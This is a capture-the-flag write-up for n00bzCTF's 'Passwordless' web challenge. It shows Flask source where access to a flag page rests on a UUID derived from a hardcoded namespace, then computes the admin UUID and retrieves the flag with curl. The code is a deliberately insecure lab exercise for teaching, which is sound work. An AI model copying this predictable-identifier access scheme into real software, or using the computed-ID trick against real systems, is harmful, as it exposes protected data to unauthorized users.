* * *
### CTF: n00bzCTF

* * *

### Challeges

- Web:
  - Passwordless

- Crypto:
  - Vinegar

- Rev:
  - Vacation

### Web:

- Passwordless

   ![image](https://github.com/user-attachments/assets/83262de2-1574-4005-b0a7-02f9b0e05295)

- Explaining the source code:

        #!/usr/bin/env python3
      from flask import Flask, request, redirect, render_template, render_template_string
      import subprocess
      import urllib
      import uuid
      global leet
      
      app = Flask(__name__)
      flag = open('/flag.txt').read()
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      
      @app.route('/',methods=['GET','POST'])
      def main():
          global username
          if request.method == 'GET':
              return render_template('index.html')
          elif request.method == 'POST':
              username = request.values['username']
              if username == 'admin123':
                  return 'Stop trying to act like you are the admin!'
              uid = uuid.uuid5(leet,username) # super secure!
              return redirect(f'/{uid}')
      
      @app.route('/<uid>')
      def user_page(uid):
          if uid != str(uuid.uuid5(leet,'admin123')):
              return f'Welcome! No flag for you :('
          else:
              return flag
      
      if __name__ == '__main__':
          app.run(host='0.0.0.0', port=1337)

- The `/<uid>` route reveals the flag, one of the requirement for creating the flag's uid is the leet uid which is already hardocded which is a vulnerability.If the uid is added to the route, it reveals the flag.

      #Leet uid
      leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      if uid != str(uuid.uuid5(leet,'admin123')):
                return f'Welcome! No flag for you :('
            else:
                return flag

- Creating the uid with python `uuid` module

        ❯ python3
      Python 3.11.7 (main, Dec  8 2023, 14:22:46) [GCC 13.2.0] on linux
      Type "help", "copyright", "credits" or "license" for more information.
      >>> import uuid
      >>> leet=uuid.UUID('13371337-1337-1337-1337-133713371337')
      >>> str(uuid.uuid5(leet,'admin123'))
      '3c68e6cc-15a7-59d4-823c-e7563bbb326c'
      >>> 

- Grabbing the flag with curl

         ❯ curl http://24.199.110.35:40150/3c68e6cc-15a7-59d4-823c-e7563bbb326c
      n00bz{1337-13371337-1337-133713371337-1337}

      

  
 
